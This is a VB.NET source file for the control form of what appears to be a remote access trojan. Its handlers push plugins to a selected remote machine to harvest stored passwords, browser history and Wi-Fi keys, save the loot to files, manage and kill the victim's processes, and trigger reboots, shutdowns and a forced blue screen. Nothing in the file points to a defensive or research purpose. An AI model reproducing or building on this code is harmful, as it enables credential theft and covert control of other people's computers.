Imports System.Threading
Imports PacketLib.Packet

Public Class Client_Form
    Private Async Sub Save_PassMenu_Click(sender As Object, e As EventArgs) Handles Save_PassMenu.Click
        Await Task.Run(Sub() Helpers.SetSavingFor4Columns(Passwords_ListView, Me.Text, "Passwords"))
    End Sub
    Private Async Sub Save_HistoryMenu_Click(sender As Object, e As EventArgs) Handles Save_HistoryMenu.Click
        Await Task.Run(Sub() Helpers.SetSavingFor4Columns(Hist_ListView, Me.Text, "History"))
    End Sub
    Private Async Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Await Task.Run(Sub() Helpers.SetSavingFor2Columns(W_PW_ListView, Me.Text, "Wifi Passwords"))
    End Sub
    Private Async Sub RecoverPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecoverPasswordsToolStripMenuItem.Click
        Loading_PW.Visible = True
        Loading_PW.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._PW
        'IO.File.ReadAllBytes("Plugins\PW.dll")

        For Each U As Clients In Form1.L

            If U.ID = Me.Text Then

                Await Task.Run(Sub() Helpers.Sender(U, P))

                Exit For
            End If
        Next

    End Sub
    Private Async Sub Recover_history_Click(sender As Object, e As EventArgs) Handles Recover_history.Click
        Loading_Hist.Visible = True
        Loading_Hist.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._WB
        'IO.File.ReadAllBytes("Plugins\WB.dll")

        For Each U As Clients In Form1.L

            If U.ID = Me.Text Then

                Await Task.Run(Sub() Helpers.Sender(U, P))

                Exit For
            End If
        Next
    End Sub
    Private Async Sub RecoverWifiPasswordToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecoverWifiPasswordToolStripMenuItem.Click
        Loading_W_PW.Visible = True
        Loading_W_PW.Active = True
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._W_PW
        'IO.File.ReadAllBytes("Plugins\NW.dll")

        For Each U As Clients In Form1.L

            If U.ID = Me.Text Then

                Await Task.Run(Sub() Helpers.Sender(U, P))

                Exit For
            End If
        Next
    End Sub
    Private Sub Custom_Button1_Click(sender As Object, e As EventArgs) Handles Custom_Button1.Click
        Me.Hide()
    End Sub

    Private Async Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Helper_Task_Label.Visible = True
        Loading_tasks.Visible = True
        Loading_tasks.Active = True
        RefreshToolStripMenuItem.Enabled = False
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._TASKS_MGR
        'IO.File.ReadAllBytes("Plugins\TM.dll")


        P.Function_Params = New Object() {Packet_Subject.RETRIEVE_TASKS}
        'New Object() {}

        For Each U As Clients In Form1.L

            If U.ID = Me.Text Then

                Await Task.Run(Sub() Helpers.Sender(U, P))

                Exit For
            End If
        Next
    End Sub

    Private Async Sub KillTaskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillTaskToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR

            P.Function_Params = New Object() {Packet_Subject.KILL_TASK, Tasks_listview.SelectedItems(0).Text}

            For Each U As Clients In Form1.L

                If U.ID = Me.Text Then

                    Await Task.Run(Sub() Helpers.Sender(U, P))

                    Exit For
                End If
            Next

        End If
    End Sub

    Private Async Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR

            P.Function_Params = New Object() {Packet_Subject.PAUSE_TASK, Tasks_listview.SelectedItems(0).Text}

            For Each U As Clients In Form1.L

                If U.ID = Me.Text Then

                    Await Task.Run(Sub() Helpers.Sender(U, P))

                    Exit For
                End If
            Next

        End If
    End Sub

    Private Async Sub ResumseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ResumseToolStripMenuItem.Click
        If Tasks_listview.SelectedItems.Count = 1 Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._TASKS_MGR

            P.Function_Params = New Object() {Packet_Subject.RESUME_TASK, Tasks_listview.SelectedItems(0).Text}

            For Each U As Clients In Form1.L

                If U.ID = Me.Text Then

                    Await Task.Run(Sub() Helpers.Sender(U, P))

                    Exit For
                End If
            Next

        End If
    End Sub

    Private Async Sub LaunchToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LaunchToolStripMenuItem.Click
        Dim ID_CMD As Integer = CMD_ListView.SelectedItems(0).Index
        Dim P As New PacketMaker
        P.Type_Packet = PacketType.PLUGIN
        P.Plugin = Plugins._MS


        Select Case ID_CMD
            Case 0
                P.Function_Params = New Object() {Packet_Subject.LOG_OUT}

            Case 1
                P.Function_Params = New Object() {Packet_Subject.REBOOT}

            Case 2
                P.Function_Params = New Object() {Packet_Subject.SHUTDOWN}

            Case 3
                P.Function_Params = New Object() {Packet_Subject.SUSPEND}

            Case 4
                P.Function_Params = New Object() {Packet_Subject.HIBERNATE}

            Case 5
                P.Function_Params = New Object() {Packet_Subject.BSOD}

            Case 6
                P.Function_Params = New Object() {Packet_Subject.MUTE_SOUND}

            Case 7
                P.Function_Params = New Object() {Packet_Subject.VOL_UP}

            Case 8
                P.Function_Params = New Object() {Packet_Subject.VOL_DOWN}

        End Select

        For Each U As Clients In Form1.L
            If U.ID = Me.Text Then
                Await Task.Run(Sub() Helpers.Sender(U, P))
                Exit For
            End If
        Next
    End Sub

    Private Sub Client_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        AddHandler Me.SizeChanged, AddressOf Make_Fiex
    End Sub

    Public Sub Make_Fiex()
        ColumnHeader12.Width = CMD_ListView.Width
    End Sub
End Class